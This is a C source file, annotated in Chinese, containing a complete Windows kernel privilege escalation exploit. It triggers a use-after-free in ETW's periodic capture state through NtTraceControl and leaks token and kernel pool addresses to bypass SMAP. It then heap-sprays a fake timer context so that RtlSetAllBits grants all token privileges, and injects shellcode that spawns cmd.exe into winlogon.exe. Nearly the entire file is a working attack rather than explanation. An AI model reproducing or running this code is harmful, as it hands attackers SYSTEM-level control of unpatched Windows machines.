#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <strsafe.h>
#include <wmistr.h>
#include <evntrace.h>
#include <psapi.h>
#include <winternl.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")

#define LOGFILE_PATH                        L"C:\\Users\\Public\\test.etl"
#define LOGSESSION_NAME                     L"My Event Trace Session"
#define SLEEP_TIME                          0x2000
#define FAKE_TIME_CONTEXTINFO_SIZE          0x30
#define SPRAY_SIZE                          0x10000
#define SystemHandleInformation             0x10
#define SystemBigPoolInformation            0x42

// run cmd.exe
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
"\x78\x65\x00";

typedef struct _ETW_UPDATE_PERIODIC_CAPTURE_STATE
{
    UINT32 	LoggerId;
    UINT32 	DueTime;	//system time units (100-nanosecond intervals)
    UINT32 	NumOfGuids;
    GUID 	Guids[ANYSIZE_ARRAY];
} ETW_UPDATE_PERIODIC_CAPTURE_STATE, * PETW_UPDATE_PERIODIC_CAPTURE_STATE;

typedef enum _ETW_FUNCTION_CODE
{
    EtwFunctionStartTrace = 1,
    EtwFunctionStopTrace = 2,
    EtwFunctionQueryTrace = 3,
    EtwFunctionUpdateTrace = 4,
    EtwFunctionFlushTrace = 5,
    EtwFunctionIncrementTraceFile = 6,

    EtwFunctionRealtimeConnect = 11,
    EtwFunctionWdiDispatchControl = 13,
    EtwFunctionRealtimeDisconnectConsumerByHandle = 14,
    EtwFunctionReceiveNotification = 16,
    EtwFunctionTraceEnableGuid = 17, // EtwTraceNotifyGuid
    EtwFunctionSendReplyDataBlock = 18,
    EtwFunctionReceiveReplyDataBlock = 19,
    EtwFunctionWdiUpdateSem = 20,
    EtwFunctionGetTraceGuidList = 21,
    EtwFunctionGetTraceGuidInfo = 22,
    EtwFunctionEnumerateTraceGuids = 23,
    // EtwFunction??? = 24,
    EtwFunctionQueryReferenceTime = 25,
    EtwFunctionTrackProviderBinary = 26,
    EtwFunctionAddNotificationEvent = 27,
    EtwFunctionUpdateDisallowList = 28,
    EtwFunctionUseDescriptorTypeUm = 31,
    EtwFunctionGetTraceGroupList = 32,
    EtwFunctionGetTraceGroupInfo = 33,
    EtwFunctionGetDisallowList = 34,
    EtwFunctionSetCompressionSettings = 35,
    EtwFunctionGetCompressionSettings = 36,
    EtwFunctionUpdatePeriodicCaptureState = 37,
    EtwFunctionGetPrivateSessionTraceHandle = 38,
    EtwFunctionRegisterPrivateSession = 39,
    EtwFunctionQuerySessionDemuxObject = 40,
    EtwFunctionSetProviderBinaryTracking = 41,
} ETW_FUNCTION_CODE;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO 
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION 
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct
{
    DWORD64 Address;
    DWORD64 PoolSize;
    char PoolTag[4];
    char Padding[4];
} BIG_POOL_INFO, * PBIG_POOL_INFO;

EXTERN_C
NTSTATUS
WINAPI
NtTraceControl(
    DWORD Operation,
    LPVOID InputBuffer,
    DWORD InputSize,
    LPVOID OutputBuffer,
    DWORD OutputSize,
    LPDWORD BytesReturned
);

typedef NTSTATUS(WINAPI* PNtSetEaFile)(
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length
    );

// GUID that identifies your trace session.
// Remember to create your own session GUID.
GUID SessionGuid;

// GUID that identifies the provider that you want
// to enable to your session.
GUID ProviderGuid;

GUID NoPermissionGuid;

LPVOID ntoskrnlBase = nullptr;

DWORD64 GetKernelPointer(HANDLE handle, DWORD type)
{
    // 申请0x20的空间
    PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);

    DWORD outBuffer = 0;
    // 查询自身拥有的所有句柄信息
    NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);

    if (status == (NTSTATUS)0xC0000004L)
    {
        free(buffer);
        buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
        status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
    }

    if (!buffer)
    {
        printf("[-] NtQuerySystemInformation error \n");
        return 0;
    }

    for (size_t i = 0; i < buffer->NumberOfHandles; i++)
    {
        DWORD objTypeNumber = buffer->Handles[i].ObjectTypeIndex;

        // type 0x5 token
        if (buffer->Handles[i].UniqueProcessId == GetCurrentProcessId() && buffer->Handles[i].ObjectTypeIndex == type)
        {
            if (handle == (HANDLE)buffer->Handles[i].HandleValue)
            {
                DWORD64 object = (DWORD64)buffer->Handles[i].Object;
                free(buffer);
                return object;
            }
        }
    }
    printf("[-] handle not found\n");
    free(buffer);
    return 0;
}

/// <summary>
/// 泄露进程令牌
/// </summary>
DWORD64 LeakEporcessKtoken()
{

    LPVOID drivers[1024] = {};
    DWORD cbNeeded = NULL;
    ntoskrnlBase = nullptr;
    // 检索系统驱动加载地址
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
    {
        // 获取ntoskrnl基址
        if (drivers[0])
        {
            ntoskrnlBase = drivers[0];
            printf("[*] ntoskrnlBase : %p\n", ntoskrnlBase);
        }
    }
    else
    {
        printf("[-] EnumDeviceDrivers failed; array size needed is %d\n", cbNeeded / sizeof(LPVOID));
    }

    // 获取自身句柄
    HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
    if (!proc)
    {
        printf("[-] OpenProcess failed\n");
        return 0;
    }

    HANDLE token = 0;
    //打开进程令牌并获取具有 TOKEN_ADJUST_PRIVILEGES 权限的进程令牌句柄
    //TOKEN_ADJUST_PRIVILEGES就表示，我们有修改进程令牌的权限
    if (!OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token))
    {
        printf("[-] OpenProcessToken failed\n");
        return 0;
    }

    DWORD64 ktoken = 0;
    for (int i = 0; i < 0x100; i++)
    {
        // 获取自身token的地址
        ktoken = GetKernelPointer(token, 0x5);

        if (ktoken != NULL)
        {
            break;
        }

    }
    return ktoken;
}

/// <summary>
/// 通过线程名寻找线程地址
/// </summary>
/// <param name="Guid"></param>
/// <param name="Type"></param>
/// <param name="Callback"></param>
/// <returns></returns>
ULONG_PTR LookForThreadNamePoolAddress(PVOID pBuffer, DWORD64 dwExpectedSize)
{
    ULONG_PTR StartAddress = (ULONG_PTR)pBuffer;
    ULONG_PTR EndAddress = StartAddress + 8 + *((PDWORD)StartAddress) * sizeof(BIG_POOL_INFO);
    ULONG_PTR ptr = StartAddress + 8;
    while (ptr < EndAddress)
    {
        PBIG_POOL_INFO info = (PBIG_POOL_INFO)ptr;
        //printf("Name:%s Size:%llx Address:%llx\n", info->PoolTag, info->PoolSize, info->Address);
        if (strncmp(info->PoolTag, "ThNm", 4) == 0 && dwExpectedSize == info->PoolSize)
        {
            return (((ULONG_PTR)info->Address) & 0xfffffffffffffff0) + sizeof(UNICODE_STRING);
        }
        ptr += sizeof(BIG_POOL_INFO);
    }
    return 0;
}



/// <summary>
/// 将伪造的bitmapheader写入线程
/// </summary>
/// <param name="hThread">线程</param>
/// <param name="wPoolSize">大小</param>
/// <param name="lpContent">伪造的bitmapheader</param>
/// <returns>Addr</returns>
ULONG_PTR AllocateInBigPool(HANDLE hThread, WORD wPoolSize, LPVOID lpContent)
{
    UNICODE_STRING target;
    target.Length = wPoolSize;
    target.MaximumLength = 0xffff;
    target.Buffer = (PWSTR)lpContent;//写入线程名称中
    ULONG_PTR Addr = 0;

    //利用函数NtSetInformationThread为一个线程设置名字
    //该线程的名字会被保存在内核池中，我们将线程名构造成PRTL_BITMAP，自然也就位于内核池中
    // 将伪造的BitMapHeader结构设置到线程名中，使其位于内核池中，以绕过SMAP保护
    HRESULT hRes = NtSetInformationThread(hThread, ThreadNameInformation, &target, sizeof(UNICODE_STRING));
    
    // 泄露线程名的地址
    if (SUCCEEDED(hRes))
    {
        DWORD dwBufSize = 1024 * 1024;
        DWORD dwOutSize;
        LPVOID pBuffer = LocalAlloc(LPTR, dwBufSize);

        //通过函数 ZwQuerySystemInformation泄露内核池地址，我们将得到PRTL_BITMAP的具体位置，这样就绕过了 SMAP
        hRes = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemBigPoolInformation, pBuffer, dwBufSize, &dwOutSize);
        if (SUCCEEDED(hRes))
        {
            DWORD dwExpectedSize = target.Length + sizeof(UNICODE_STRING);

            //通过线程名称寻找地址
            Addr = LookForThreadNamePoolAddress(pBuffer, dwExpectedSize);
        }

        LocalFree(pBuffer);
    }

    return Addr;
}

/// <summary>
/// 进程 泄露得到PRTL_BITMAP的具体位置
/// </summary>
/// <param name="handle"></param>
/// <param name="type"></param>
/// <returns></returns>
int  fnExploit(int lpParameter)
{

    do
    {
        Sleep(0x500000);

    } while (true);

}

/// <summary>
/// 注入winlogon
/// </summary>
/// <param name="handle"></param>
/// <param name="type"></param>
/// <returns></returns>
void InjectToWinlogon()
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    //快照遍历
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    int pid = -1;
    if (Process32First(snapshot, &entry))
    {
        while (Process32Next(snapshot, &entry))
        {
            if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0)
            {
                pid = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);

    if (pid < 0)
    {
        printf("Could not find process\n");
        return;
    }

    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!h)
    {
        printf("Could not open process: %x", GetLastError());
        return;
    }

    void* buffer = VirtualAllocEx(h, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!buffer)
    {
        printf("[-] VirtualAllocEx failed\n");
    }

    if (!buffer)
    {
        printf("[-] remote allocation failed");
        return;
    }
    //写入shellcode
    if (!WriteProcessMemory(h, buffer, shellcode, sizeof(shellcode), 0))
    {
        printf("[-] WriteProcessMemory failed");
        return;
    }

    HANDLE hthread = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);

    if (hthread == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateRemoteThread failed");
        return;
    }
}


/// <summary>
/// 获取函数地址
/// </summary>
/// <param name="name">函数名称</param>
DWORD64 GetGadgetAddr(const char* name)
{
    DWORD64 base = (DWORD64)ntoskrnlBase;
    HMODULE mod = LoadLibraryEx(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!mod)
    {
        printf("[-] leaking ntoskrnl version\n");
        return 0;
    }
    DWORD64 offset = (DWORD64)GetProcAddress(mod, name);
    DWORD64 returnValue = base + offset - (DWORD64)mod;
    //printf("[+] FunAddr: %p\n", (DWORD64)returnValue);
    FreeLibrary(mod);
    return returnValue;
}

/// <summary>
/// 主函数
/// </summary>
int main()
{
    //! 获取NtSetEaFile地址 后面会使用NtSetEaFile进行堆喷占位 
    //该函数随后调用IopVerifierExAllocatePoolWithQuota申请类型为NonPagedPoolNx的Pool
    PNtSetEaFile NtSetEaFile = (PNtSetEaFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetEaFile");

    if (!NtSetEaFile) 
    {

        printf("[-] Get NtSetEaFile failed , error is : %p\n", GetLastError());
        exit(-1);
    }

    HANDLE file = CreateFile(L"\\\\.\\PEAuth", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, NULL, NULL);
    if (file == INVALID_HANDLE_VALUE) 
    {
        printf("[-] CreateFile failed , error is : %p\n", GetLastError());
        exit(-1);
    }

    //进程令牌
    DWORD64 ktoken = LeakEporcessKtoken();
    printf("[*] Get ktoken addr : %p\n", ktoken);



    /*
    
    NTSYSAPI VOID RtlSetAllBits(
      [in] PRTL_BITMAP BitMapHeader         // 指向描述位图的 RTL_BITMAP 结构的指针。 
                                            // 此结构必须已由 RtlInitializeBitMap 例程初始化。
    );
    void __stdcall RtlSetAllBits(PRTL_BITMAP BitMapHeader)
    {
      unsigned int *v1; // r8
      unsigned __int64 size; // r9
      v1 = BitMapHeader->Buffer;
      // size相当于是BitMapHeader->SizeOfBitMap 以2为底的对数减1，向下取整的结果
      size = (unsigned __int64)(4 * (((BitMapHeader->SizeOfBitMap & 0x1F) != 0) + (BitMapHeader->SizeOfBitMap >> 5))) >> 2;
      if ( size )
      {
        if ( (unsigned __int8)v1 & 4 )
        {
          *v1 = -1;
          if ( !--size )
            return;
          ++v1;
        }
        memset(v1, 0xFFu, 8 * (size >> 1));
        if ( size & 1 )
          v1[size - 1] = -1;
      }
    }
    */

    //! 其中有一个 memset 可以把 buffer 处的值改为 0xff ，通过伪造 BitMapHeader ，我们可以向任何地址填充指定长度的 0xff 
    //! 将目标内存写入 8∗(size/2)个 0xFF，这要是目标内存为 Token−>Privilege，足以使对应的进程获得所有权限

    char GadgetName[] = "RtlSetAllBits";
    //获取RtlSetAllBits地址
    DWORD64 GadgetAddr = GetGadgetAddr(GadgetName);

    printf("[*] Get gadget %s addr : %p\n", GadgetName, GadgetAddr);

    //!? 绕过SMAP伪造PRTL_BITMAP
    //! 在 Win8及其之后的系统开启了 SMAP，意味着内核无法直接访问用户态空间下的数据
    //! 所以不能直接用位于用户空间的PRTL_BITMAP作为 RtlSetAllBits的参数
    //! 利用函数NtSetInformationThread为一个线程设置名字，
    //该线程的名字会被保存在内核池中，我们将线程名构造成PRTL_BITMAP，自然也就位于内核池中。
    //通过函数 ZwQuerySystemInformation泄露内核池地址，我们将得到PRTL_BITMAP的具体位置，这样就绕过了 SMAP
    
    DWORD dwThreadID = 0;
    // 创建一个线程
    HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)fnExploit, 0, 0, &dwThreadID);

    if (!hThread) 
    {
        printf("[-] CreateThread failed , error is : %p\n", GetLastError());
        exit(-1);
    }

    printf("[*] Thread tid : %p\n", dwThreadID);

    DWORD dwSize = 0x1000;

    PCHAR lpData = (PCHAR)VirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_READWRITE);

    memset(lpData, 0, dwSize);
    //! 需要伪造的 BitMapHeader 内容如下
    *(ULONG64*)lpData = 0x80; // RTL_BITMAP->SizeOfBitMap
    *(ULONG64*)(lpData + 0x8) = ktoken + 0x40; // RTL_BITMAP->Buffer=token.Privileges

    ULONG_PTR PoolChunk = AllocateInBigPool(hThread, (WORD)dwSize, (LPVOID)lpData);
    if (PoolChunk)
    {
        printf("[*] data stored at %p\n", PoolChunk);
    }


    ULONG status = ERROR_SUCCESS;
    TRACEHANDLE SessionHandle = 0;
    EVENT_TRACE_PROPERTIES* pSessionProperties = NULL;
    ULONG BufferSize = 0;
    BOOL TraceOn = TRUE;

    // set guid
    CLSIDFromString(L"{14f8138e-3b61-580b-544b-2609378ae460}", &SessionGuid);
    CLSIDFromString(L"{14f8138e-3b61-580b-544b-2609378ae460}", &ProviderGuid);
    CLSIDFromString(L"{6b4012d0-22b6-464d-a553-20e9618403a2}", &NoPermissionGuid);

    // Allocate memory for the session properties. The memory must
    // be large enough to include the log file name and session name,
    // which get appended to the end of the session properties structure.

    BufferSize = sizeof(EVENT_TRACE_PROPERTIES) + sizeof(LOGFILE_PATH) + sizeof(LOGSESSION_NAME);
    pSessionProperties = (EVENT_TRACE_PROPERTIES*)malloc(BufferSize);
    if (NULL == pSessionProperties)
    {
        wprintf(L"[-] Unable to allocate %d bytes for properties structure.\n", BufferSize);
        exit(-1);
    }

    // Set the session properties. You only append the log file name
    // to the properties structure; the StartTrace function appends
    // the session name for you.

    ZeroMemory(pSessionProperties, BufferSize);
    pSessionProperties->Wnode.BufferSize = BufferSize;
    pSessionProperties->Wnode.Flags = WNODE_FLAG_TRACED_GUID;
    pSessionProperties->Wnode.ClientContext = 1; //QPC clock resolution
    pSessionProperties->Wnode.Guid = SessionGuid;
    pSessionProperties->LogFileMode = EVENT_TRACE_FILE_MODE_SEQUENTIAL;
    pSessionProperties->MaximumFileSize = 1;  // 1 MB
    pSessionProperties->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
    pSessionProperties->LogFileNameOffset = sizeof(EVENT_TRACE_PROPERTIES) + sizeof(LOGSESSION_NAME);
    StringCbCopy((LPWSTR)((char*)pSessionProperties + pSessionProperties->LogFileNameOffset), sizeof(LOGFILE_PATH), LOGFILE_PATH);

    // Create the trace session.

    status = StartTrace((PTRACEHANDLE)&SessionHandle, LOGSESSION_NAME, pSessionProperties);
    if (ERROR_SUCCESS != status)
    {
        wprintf(L"[-] StartTrace() failed with %lu\n", status);
        exit(-1);
    }

    // Enable the providers that you want to log events to your session.

    status = EnableTraceEx2(
        SessionHandle,
        (LPCGUID)&ProviderGuid,
        EVENT_CONTROL_CODE_ENABLE_PROVIDER,
        TRACE_LEVEL_INFORMATION,
        0,
        0,
        0,
        NULL
    );

    if (ERROR_SUCCESS != status)
    {
        wprintf(L"[-] EnableTrace() failed with %lu\n", status);
        TraceOn = FALSE;
        exit(-1);
    }

    wprintf(L"[*] The LoggerId is : %p\n", SessionHandle);

    IO_STATUS_BLOCK iostatus = { 0 };
    char buffer[FAKE_TIME_CONTEXTINFO_SIZE] = { 0 };
    //伪造的 timerContextinfo 的内容如下
    *(ULONG64*)buffer = 0;                    //? timerContextinfo->WorkItem.List.Flink = 0; (这样当前的 timerContextinfo 将被验证，并放到队列)
    *(ULONG64*)(buffer + 0x10) = GadgetAddr;  //? timerContextinfo->WorkItem.WorkerRoutine = vulFunction(RtlSetAllBits()); 这个位置是回调函数，会被执行
    *(ULONG64*)(buffer + 0x18) = PoolChunk;   //? timerContextinfo->WorkItem.Parameter = vulParameter(RTL_BITMAP FakeBitMapHeader);
    *(WORD*)(buffer + 0x28) = SessionHandle;  //? timerContextinfo->LoggerId = LoggerId;

    DWORD returnLength = 0;

    //! 第一次调用NtTraceControl
    ETW_UPDATE_PERIODIC_CAPTURE_STATE InBuff1 = 
    {
        (UINT32)SessionHandle,
        0,
        1,
        { SessionGuid } 
    };

    status = NtTraceControl(EtwFunctionUpdatePeriodicCaptureState, &InBuff1, sizeof(InBuff1), &InBuff1, sizeof(InBuff1), &returnLength);
    if (!NT_SUCCESS(status)) 
    {
        printf("[-] Failed to call NtTraceControl : %p\n", status);
        exit(-1);
    }

    //! 第二次
    ETW_UPDATE_PERIODIC_CAPTURE_STATE InBuff2 = 
    {
        (UINT32)SessionHandle,
        0,
        1,
        { NoPermissionGuid } 
    };

    status = NtTraceControl(EtwFunctionUpdatePeriodicCaptureState, &InBuff2, sizeof(InBuff2), &InBuff2, sizeof(InBuff2), &returnLength);
    if (!NT_SUCCESS(status)) 
    {
        printf("[-] Failed to call NtTraceControl : %p\n", status);
        exit(-1);
    }

    // Sleep(SLEEP_TIME);

    //!? 堆喷 伪造的 timerContextinfo占位  heap spray
    printf("[*] Spray fake timerContextinfo\n");
    for (int i = 0; i < SPRAY_SIZE; i++) 
    {
        NtSetEaFile(file, &iostatus, buffer, sizeof(buffer));
    }

    
    printf("[*] Trigger UAF\n");
    //! 第三次
    status = NtTraceControl(EtwFunctionUpdatePeriodicCaptureState, &InBuff1, sizeof(InBuff1), &InBuff1, sizeof(InBuff1), &returnLength);
    if (!NT_SUCCESS(status)) 
    {
        printf("[-] Failed to call NtTraceControl : %p\n", status);
        exit(-1);
    }

    Sleep(SLEEP_TIME);

    
    
    printf("[+] Inject shellcode to winlogin.exe!\n");

    //注入winlogon
    InjectToWinlogon();

    if (SessionHandle)
    {
        if (TraceOn)
        {
            status = EnableTraceEx2(
                SessionHandle,
                (LPCGUID)&ProviderGuid,
                EVENT_CONTROL_CODE_DISABLE_PROVIDER,
                TRACE_LEVEL_INFORMATION,
                0,
                0,
                0,
                NULL
            );
        }

        status = ControlTrace(SessionHandle, LOGSESSION_NAME, pSessionProperties, EVENT_TRACE_CONTROL_STOP);

        if (ERROR_SUCCESS != status)
        {
            wprintf(L"ControlTrace(stop) failed with %lu\n", status);
        }
    }

    if (pSessionProperties)
    {
        free(pSessionProperties);
        pSessionProperties = NULL;
    }

}